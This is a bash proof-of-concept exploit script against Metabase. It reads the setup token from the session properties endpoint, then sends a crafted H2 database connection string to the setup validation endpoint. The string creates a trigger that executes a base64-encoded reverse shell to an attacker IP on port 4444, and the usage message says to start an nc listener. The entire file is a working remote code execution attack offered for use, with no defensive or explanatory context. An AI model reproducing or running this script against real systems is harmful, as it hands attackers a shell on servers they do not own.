#!/bin/bash

if [ $# -lt 2 ]; then
  echo "Use: bash metabase_poc.sh http://127.0.0.1:3000 listener_ip"
  echo "Install listener before use: nc -lvnp 4444"
  exit 1
fi

listener_port=4444
payload=`echo -n "bash -i >&/dev/tcp/${2}/${listener_port} 0>&1" | base64`

curl_data=`curl -s -k "${1}/api/session/properties"`

setup_token=`echo "$curl_data"| jq -r '."setup-token"'`
metabase_version=`echo "$curl_data"| jq -r '.version.tag'`

echo "Payload = $payload"
echo "Setup_token = $setup_token"
echo "Version = $metabase_version"

echo -e "\n\t [*] TRY EXPLOIT [*]"

curl -s -k -X POST "${1}/api/setup/validate" \
    -H 'Content-Type: application/json' \
    --data-binary '{ "token": "'$setup_token$'", "details": { "is_on_demand": false, "is_full_sync": false, "is_sample": false, "cache_ttl": null, "refingerprint": false, "auto_run_queries": true, "schedules": {}, "details": { "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\\njava.lang.Runtime.getRuntime().exec(\'bash -c {echo,'$payload$'}|{base64,-d}|{bash,-i}\')\\n$$--=x", "advanced-options": false, "ssl": true }, "name": "test", "engine": "h2" }}'
